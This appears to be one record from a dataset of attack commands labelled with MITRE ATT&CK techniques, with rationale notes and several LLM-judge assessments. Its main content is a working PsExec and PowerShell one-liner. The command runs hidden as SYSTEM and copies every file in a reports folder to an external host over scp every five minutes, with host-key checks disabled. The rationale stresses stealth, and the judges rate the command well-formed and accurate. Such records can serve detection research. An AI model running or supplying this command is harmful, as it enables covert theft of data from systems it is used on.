command: psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command "$env:Path += ';C:\Windows\System32\OpenSSH'; $sent='C:\ProgramData\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true) { Get-ChildItem 'C:\Users\Public\Reports' -File -Recurse | ForEach-Object { & scp -q -o StrictHostKeyChecking=no $_.FullName user@203.0.113.10:/var/drop/ > $null 2>&1; if ($LASTEXITCODE -eq 0) { Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep -Seconds 300 }"
explanation: Periodically scans a reports directory and automatically exfiltrates files to an SFTP server using scp, then moves exfiltrated files to a quarantine folder to avoid duplication.
rationale_steps: Run as hidden SYSTEM using PSExec for elevated, quiet execution.
Ensure OpenSSH in PATH for scp availability.
Loop through target directory and upload files with scp using quiet mode.
Move successfully uploaded files to C:\ProgramData\.sent to prevent re-exfiltration.
Sleep between cycles to minimize resource usage and network noise.

llm_judgments.syntactic_justification: Well-formed PsExec invocation with valid flags and a PowerShell command that has balanced quotes/braces, proper separators, and correct redirections.
llm_judgments.semantic_justification: Implements automated periodic exfiltration via scp and quarantines sent files, but is likely to fail without admin rights for -s and without non-interactive SSH authentication configured.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes, braces, and parentheses, valid PowerShell constructs, proper flag usage for psexec and scp, and correct semicolon separators throughout the script block.
llm_judgments.semantic_justification: The command precisely implements T1020 automated exfiltration by using psexec to run a hidden, privileged PowerShell loop that periodically scans a reports directory, transfers files via scp to an external SFTP server, and moves successfully exfiltrated files to a tracking folder to prevent re-exfiltration — fully matching the technique's batching, scheduling, and automated transfer behaviors.

llm_judgments.syntactic_justification: The command is perfectly formed with balanced quoting, proper PowerShell syntax for the loop and file handling, and correct flag usage for PsExec and SCP.
llm_judgments.semantic_justification: The command accurately implements MITRE ATT&CK T1020 by establishing a persistent loop that identifies new files, uses a standard protocol (SCP) for transfer, and implements a primitive tracking mechanism by moving sent files to avoid duplication.
